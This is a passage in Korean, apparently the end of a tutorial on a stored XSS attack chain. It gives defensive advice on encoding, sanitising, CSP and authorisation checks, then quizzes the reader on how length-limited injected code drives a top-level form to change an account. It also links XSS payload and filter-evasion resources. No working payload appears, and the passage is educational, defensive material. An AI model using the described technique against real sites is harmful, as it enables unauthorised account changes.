HTML 본문, HTML 속성, JavaScript 문자열은 서로 다른 출력 위치다. HTML용 이스케이프만 적용하고 JavaScript에서도 안전하다고 가정하면 안 된다. HTML의 `<script>` 안에 값을 넣어야 한다면 JavaScript 문자열 처리뿐 아니라 HTML 파서가 인식하는 스크립트 종료도 고려하는, 해당 위치에 맞는 안전한 직렬화가 필요하다.

HTML 메모 기능에는 허용할 요소와 속성을 정한 검증된 정화 처리가 필요하다. 폼과 iframe이 서비스에 필요하지 않다면 허용할 이유도 없다. CSP는 추가 방어로 사용하되, 출력 처리의 대체 수단으로 취급하지 않는다. [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

마지막으로 상태를 변경하는 서버 기능에서는 인증과 수정 권한을 검증한다. 길이 제한은 이름의 형식을 관리하는 규칙이며, 코드 삽입이나 권한 검사를 대신하지 않는다.

### 이해했는지 확인하기

| 질문 | 설명할 수 있어야 하는 답 |
| :--- | :--- |
| `console.log()`가 위험한 실행 함수인가? | 아니다. 서버가 만든 JavaScript 소스에서 문자열 경계가 깨지는 것이 원인이다. |
| 이 예시는 20자 검사를 없앴는가? | 아니다. 제한 안의 코드로 다른 위치의 폼을 활용한다. |
| 긴 URL과 전송할 데이터는 어디에 있는가? | 최상위 문서의 HTML 폼에 있다. |
| `top`은 언제나 바로 위 부모인가? | 아니다. 최상위 창이며, 한 단계 iframe일 때만 부모와 같다. |
| HTML 폼만 삽입하면 자동 제출되는가? | 아니다. 이 예시에서는 프로필에서 실행되는 코드가 제출을 시작한다. |
| 외부 사이트의 iframe으로 바꾸면 같은가? | 아니다. 프레임 간 DOM 접근에는 동일 출처 등의 조건이 필요하다. |
| `submit()` 호출 성공은 계정 변경 성공인가? | 아니다. 서버가 요청을 받아들이고 실제 상태가 바뀌었는지까지 확인해야 한다. |

---

## 참고자료

### 공식 및 테스트 가이드

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PortSwigger - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### 커뮤니티 참고 / 도구

- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
